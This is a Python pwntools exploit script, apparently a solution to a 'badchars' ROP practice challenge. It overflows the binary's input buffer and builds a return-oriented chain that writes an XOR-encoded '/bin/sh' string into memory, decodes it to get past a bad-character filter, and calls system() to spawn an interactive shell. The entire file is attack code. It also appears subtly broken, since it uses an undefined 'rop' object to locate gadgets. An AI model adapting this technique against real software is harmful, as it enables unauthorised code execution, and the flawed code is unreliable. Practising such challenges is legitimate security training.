#!/usr/bin/env python
from pwn import *
import struct
import binascii

bin_name = './badchars'

def has_badchars(string, badchars):
    for i in string:
        if i in badchars:
            return True
    return False

def xor(string, key):
    xored = ''
    for i in string:
        xored += chr(ord(i) ^ key)

    return xored

context.clear(arch='amd64')

str_write_orig = '/bin/sh'
badchars = 'bic/ fns'

xor_key = ord('X')
str_write = str_write_orig

str_write += chr(xor_key)
if (len(str_write) % 8) != 0:
    str_write += chr(xor_key) * (8 - len(str_write) % 8)

binary = ELF(bin_name)
proc   = process(bin_name)

pop_r12_r13 = rop.find_gadget(['pop r12', 'pop r13', 'ret'])[0]
pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
pop_rdi     = rop.find_gadget(['pop rdi', 'ret'])[0]
usefulFunction = binary.symbols['usefulFunction']

write_addr   = 0x601800 # writeable
xor_r15_r14  = 0x400b30 # xor byte ptr [r15], r14b; ret;
write_prim   = 0x400b34 # mov qword ptr [r13], r12; ret
system       = 0x4009e8 # binary.symbols['system']
padding_len  = 40

str_write_xor = xor(str_write, xor_key)

if has_badchars(str_write_xor, badchars):
    raise ValueError('has badchars')

payload = padding_len * b'A'
for i in range(len(str_write) // 8):
    payload += p64(pop_r12_r13)
    payload += bytes(str_write_xor[i * 8:(i + 1) * 8], 'ascii')
    payload += p64(write_addr + i * 8)
    payload += p64(write_prim)

for i in range(len(str_write_xor) - 1):
    payload += p64(pop_r14_r15)
    payload += bytes(chr(xor_key), 'ascii') * 8
    payload += p64(write_addr + i)
    payload += p64(xor_r15_r14)

payload += p64(pop_rdi)
payload += p64(write_addr)
payload += p64(system)

proc.recvuntil('\n> ')
proc.sendline(payload)
log.info('payload: ' + binascii.hexlify(payload).decode('ascii'))
log.info('Should system("{}") ...'.format(str_write_orig))
proc.interactive()
